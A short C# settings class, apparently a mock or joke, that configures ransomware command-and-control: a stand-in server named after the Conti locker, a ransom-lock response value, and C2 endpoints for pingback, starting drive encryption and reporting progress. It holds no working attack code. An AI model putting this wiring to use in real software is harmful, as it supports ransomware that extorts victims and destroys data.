using System;
using Sarcasm;

namespace Atlas
{
    internal class ConnectionSettings
    {
        public enum vaildResponses
        {
            NA,
            lockSystemComputerforRansom
        }

        public String serverAddress = "http://clearly-new-conti-locker.code/atlas";

        public dynamic serverEndpoints = new
        {
            getCommand = "/C2/recv_pingback",
            updateStatus = "/C2/beginCryptDrives",
            updateProgres = "/C2/update_progress"
        };
    }
}
